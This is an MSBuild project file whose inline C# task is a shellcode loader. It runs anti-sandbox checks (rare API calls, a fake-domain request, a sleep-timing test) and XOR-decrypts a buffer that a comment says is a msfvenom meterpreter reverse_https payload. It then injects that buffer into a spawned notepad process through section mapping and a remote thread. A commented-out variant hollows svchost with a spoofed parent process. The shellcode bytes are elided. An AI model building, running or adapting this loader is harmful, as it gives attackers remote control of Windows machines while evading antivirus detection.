<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	<!-- This inline task executes c# code. -->
	<!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj -->
	<Target Name="Hello">
		<ClassExample />
	</Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
		<Task>
			<Code Type="Class" Language="cs">
				<![CDATA[

using System;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Linq;
using Microsoft.Win32;
using System.Threading;
using System.Reflection;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        //Console.WriteLine("Hello From a Class.");
        Hollow.Start();
        return true;
    }
}

//Based on Jared Atkinson's And Justin Warner's Work
public class Hollow
{
    public const int ProcessBasicInformation = 0;
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        CreateProcess = 0x000000080
    }
    public static class CreationFlags
    {
        public const uint SUSPENDED = 0x4;
        public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }
    public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
    public const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
    public const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr FlsAlloc(IntPtr callback);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    //For remoteInject:
    public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    public const uint SECTION_MAP_READ = 0x0004;
    public const uint SECTION_MAP_WRITE = 0x0002;
    public const uint SECTION_MAP_EXECUTE = 0x0008;
    public const uint PAGE_READ_WRITE = 0x04;
    public const uint PAGE_READ_EXECUTE = 0x20;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint SEC_COMMIT = 0x8000000;

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
    static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
    static extern int NtClose(IntPtr hObject);

    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);

    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp --encrypt xor --encrypt-key a
    public static byte[] buf = new byte[656] {0x9d,0x29,0xe2,0x85,0x91,0x89,
.....................................};

    public static void Start()
    {
        // Check if we're in a sandbox by calling a rare-emulated API
        if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
        {
            return;
        }

        //Web request to fake domain check:
        try
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://sldkfjsdkfjdskfjsldkfjlsdjfyyue.com/");
            HttpWebResponse res1 = (HttpWebResponse)req.GetResponse();
            if (res1.StatusCode == HttpStatusCode.OK)
            {
                return;
            }
        }
        catch (WebException we)
        {
            Console.WriteLine("\r\nWeb Exception as Expected. Error: {0}", we.Status);
        }

        //Another emulated API check:
        IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
        if (ptrCheck == null)
        {
            return;
        }

        // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
        var rand = new Random();
        uint dream = (uint)rand.Next(10000, 20000);
        double delta = dream / 1000 - 0.5;
        DateTime before = DateTime.Now;
        Sleep(dream);
        if (DateTime.Now.Subtract(before).TotalSeconds < delta)
        {
            Console.WriteLine("Sleep check failed!");
            return;
        }


        Console.WriteLine("Starting Hollower...");
        Thread.Sleep(1000);

        // XOR-decrypt the shellcode
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(buf[i] ^ (byte)'a');
        }

/*
        //spoofing ppid:
        int parentProc = 0;
        string[] processes = { "spoolsv", "winlogon" };
		
        foreach (string proc in processes)
        {
		    IntPtr procHandle = IntPtr.Zero;
            IntPtr lpSize = IntPtr.Zero;
            bool res = false;

            // Create the target process (e. g., svchost.exe) in a suspended state
            STARTUPINFOEX siex = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            try
            {
                Console.WriteLine("trying Parent:: " + proc);
                Process[] pList0 = Process.GetProcessesByName(proc);

                if (pList0.Length == 0)
                {
                    break;
                }
                int processId0 = 0;
                IntPtr hRemoteProcess0 = IntPtr.Zero;
                foreach (Process p in pList0)
                {
                    parentProc = p.Id;
                    Console.WriteLine("PPID:: " + parentProc);
                    procHandle = OpenProcess(ProcessAccessFlags.CreateProcess, false, parentProc);
                    if (procHandle != IntPtr.Zero)
                    {
					    Console.WriteLine("Got handle");
                        break;
                    }
                }

                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                siex.lpAttributeList = Marshal.AllocHGlobal(IntPtr.Size);
                InitializeProcThreadAttributeList(siex.lpAttributeList, 2, 0, ref lpSize);
                IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, procHandle);
                UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
                UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
				res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, out pi);
				if (!res)
                {
                    Console.WriteLine("Didn't work :(");
                    parentProc = 0;
                    continue;
                }
                // Query created process to extract its base address pointer from PEB (Process Environment Block)
                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
                // Pointer to the base address of the EXE image: BASE_ADDR_PTR = PEB_ADDR + 0x10
                IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);
                // Read 8 bytes of memory (IntPtr.Size is 8 bytes for x64) pointed by the image base address pointer (ptrImageBaseAddress) in order to get the actual value of the image base address
                byte[] baseAddressBytes = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
                // We're got bytes as a result of memory read, then converted them to Int64 and casted to IntPtr
                IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
                // Read 200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address
                byte[] data = new byte[0x200];
                ReadProcessMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
                // "e_lfanew" field (4 bytes, UInt32; contains the offset for the PE header): e_lfanew = BASE_ADDR + 0x3C
                uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
                // EntryPoint RVA (Relative Virtual Address) offset: ENTRYPOINT_RVA_OFFSET = e_lfanew + 0x28
                uint entrypointRvaOffset = e_lfanew + 0x28;
                // EntryPoint RVA (4 bytes, UInt32; contains the offset for the executable EntryPoint address): ENTRYPOINT_RVA = BASE_ADDR + ENTRYPOINT_RVA_OFFSET
                uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
                // Absolute address of the executable EntryPoint: ENTRYPOINT_ADDR = BASE_ADDR + ENTRYPOINT_RVA
                IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);
                // Write the shellcode to the EntryPoint address and resume thread execution
                WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
                ResumeThread(pi.hThread);
                break;
            }
            catch (Exception e)
            {
                parentProc = 0;
                continue;
            }
        }

        if (parentProc > 0)
        {
            Console.WriteLine("[*] Success! New Parent PID Found: {0}", parentProc);
            return;
        }
        else
        {
            Console.WriteLine("Failed...");
        }
*/
		//Alternate Method - Remote Inject:
	    Console.WriteLine("Trying Remote Injection into notepad...");
	    Console.WriteLine("Starting notepad process for potential injection...");
        var p6 = new System.Diagnostics.Process();
        p6.StartInfo.FileName = "notepad.exe";
        p6.StartInfo.RedirectStandardOutput = true;
        p6.StartInfo.UseShellExecute = false;
        p6.StartInfo.CreateNoWindow = true;
        p6.Start();

	    int bufLength = buf.Length;
        UInt32 uBufLength = (UInt32)bufLength;
        // Get handle on a local process
        IntPtr hLocalProcess = Process.GetCurrentProcess().Handle;
        // Get handle on a remote process (by name)
        string processName = "notepad";
        Process[] pList = Process.GetProcessesByName(processName);
        if (pList.Length == 0)
        {
            Console.WriteLine("[-] No such process");
            return;
        }
        int processId = 0;
        IntPtr hRemoteProcess = IntPtr.Zero;
        foreach (Process p in pList)
        {
            processId = p.Id;
            hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
            if (hRemoteProcess != IntPtr.Zero)
            {
                break;
            }

        }

        if (hRemoteProcess == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to open remote process");
            return;
        }

        // Create RWX memory section for the shellcode
        IntPtr hSection = new IntPtr();
        if (NtCreateSection(ref hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref uBufLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero) != 0)
        {
            Console.WriteLine("[-] Failed to create a section for the shellcode");
            return;
        }

        // Map the view of created section into the LOCAL process's virtual address space (as R-W)
        IntPtr baseAddressL = new IntPtr();
        ulong sectionOffsetL = new ulong();
        if (NtMapViewOfSection(hSection, hLocalProcess, ref baseAddressL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out uBufLength, 2, 0, PAGE_READ_WRITE) != 0)
        {
            Console.WriteLine("[-] failed to map the view into local process's space");
            return;
        }

        // Map the view of (the same) created section into the REMOTE process's virtual address space (as R-E)
        IntPtr baseAddressR = new IntPtr();
        ulong sectionOffsetR = new ulong();
        if (NtMapViewOfSection(hSection, hRemoteProcess, ref baseAddressR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out uBufLength, 2, 0, PAGE_READ_EXECUTE) != 0)
        {
            Console.WriteLine("[-] failed to map the view into remote process's space");
            return;
        }

        // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
        Marshal.Copy(buf, 0, baseAddressL, bufLength);

        // BEGIN DEBUG (check if the shellcode was copied correctly)
        byte[] remoteMemory = new byte[bufLength];
        IntPtr bytesRead = new IntPtr();
        ReadProcessMemory(hRemoteProcess, baseAddressR, remoteMemory, remoteMemory.Length, out bytesRead);
        if (!(buf.Length == remoteMemory.Length && memcmp(buf, remoteMemory, (UIntPtr)buf.Length) == 0))
        {
            Console.WriteLine("[-] DEBUG: Shellcode bytes read from remotely mapped view do not match with local buf");
            return;
        }
        // END DEBUG

        // Execute the shellcode in a remote thread (also can be done with CreateRemoteThread)
        //CreateRemoteThread(hRemoteProcess, IntPtr.Zero, 0, baseAddressR, IntPtr.Zero, 0, IntPtr.Zero)
        IntPtr threadHandle = new IntPtr();
        if (RtlCreateUserThread(hRemoteProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, baseAddressR, IntPtr.Zero, ref threadHandle, IntPtr.Zero) != IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to create a remote thread");
            return;
        }
        Console.WriteLine(String.Format("[+] Successfully injected shellcode into remote process {0}", processId));

        // Clean up
        NtUnmapViewOfSection(hLocalProcess, baseAddressL);
        NtClose(hSection);

		
    }
}
        ]]>
			</Code>
		</Task>
	</UsingTask>
</Project>
